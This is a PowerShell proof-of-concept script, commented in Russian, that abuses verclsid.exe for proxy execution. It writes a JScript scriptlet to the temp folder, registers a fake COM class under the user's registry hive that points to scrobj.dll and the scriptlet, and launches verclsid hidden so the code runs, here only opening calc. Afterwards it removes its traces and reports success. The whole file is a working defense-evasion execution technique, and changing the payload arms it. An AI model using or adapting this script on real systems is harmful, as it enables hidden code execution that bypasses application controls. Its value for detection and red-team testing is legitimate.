function Invoke-VerclsidFinal {
    $CLSID = "{" + [Guid]::NewGuid().ToString().ToUpper() + "}"
    $TempDir = $env:TEMP
    $SctPath = Join-Path $TempDir "$([Guid]::NewGuid()).sct"
    $RegPath = "HKCU:\Software\Classes\CLSID\$CLSID"
    $Result = $false
    $ExecutionChecked = $false
    $calcPID = $null

    try {
        # Создание скриптлета
@"
<?XML version="1.0"?>
<scriptlet>
<registration progid="FinalApp" classid="$CLSID"></registration>
<script language="JScript">
<![CDATA[new ActiveXObject("WScript.Shell").Run("calc.exe");]]>
</script>
</scriptlet>
"@ | Out-File $SctPath -Encoding ASCII

        # Настройка реестра
        New-Item -Path "$RegPath\InprocServer32" -Force | Out-Null
        Set-ItemProperty -Path "$RegPath\InprocServer32" `
            -Name "(Default)" -Value "C:\Windows\System32\scrobj.dll" -Force
        Set-ItemProperty -Path "$RegPath\InprocServer32" `
            -Name "ThreadingModel" -Value "Apartment" -Force
        New-Item -Path "$RegPath\ScriptletURL" -Force | Out-Null
        Set-ItemProperty -Path "$RegPath\ScriptletURL" `
            -Name "(Default)" -Value "file:///$($SctPath.Replace('\','/'))" -Force

        # Асинхронный запуск
        $verclsid = Start-Process verclsid.exe `
            -ArgumentList "/S /C $CLSID" `
            -WindowStyle Hidden `
            -PassThru

        # Отслеживание процесса с привязкой к PID
        $timeout = 50 # 50 попыток по 100ms = 5 секунд
        $processFound = $false
        
        do {
            $calcProcess = Get-Process -Name "*calc*" -ErrorAction SilentlyContinue | 
                Where-Object { 
                    $_.StartTime -gt $verclsid.StartTime -and
                    $_.Path -like "*System32*" -and
                    $_.MainWindowHandle -ne 0
                } |
                Select-Object -First 1
            
            if ($null -ne $calcProcess) {
                $processFound = $true
                $ExecutionChecked = $true
                $calcPID = $calcProcess.Id
                break
            }
            
            Start-Sleep -Milliseconds 100
            $timeout--
        } while (-not $processFound -and $timeout -gt 0)

        if ($processFound) {
            # Используем код возврата taskkill вместо анализа вывода
            & taskkill /F /PID $calcPID /T 2>&1 | Out-Null
            Start-Sleep -Milliseconds 500
            if ($LASTEXITCODE -eq 0 -and -not (Get-Process -Id $calcPID -ErrorAction SilentlyContinue)) {
                $Result = $true
            } else {
                $Result = $false
            }
        }
    }
    catch {
        if (-not $ExecutionChecked) { $Result = $false }
    }
    finally {
        # Очистка ресурсов
        Remove-Item -Path $RegPath -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $SctPath -Force -ErrorAction SilentlyContinue
        
        if ($calcPID) {
            & taskkill /F /PID $calcPID /T 2>&1 | Out-Null
        }
    }

    if ($Result) {
        Write-Host "[SUCCESS] Code executed and cleaned" -ForegroundColor Green
        return 0
    }
    else {
        Write-Host "[FAILED] Execution or cleanup failed" -ForegroundColor Red
        return 1
    }
}

Invoke-VerclsidFinal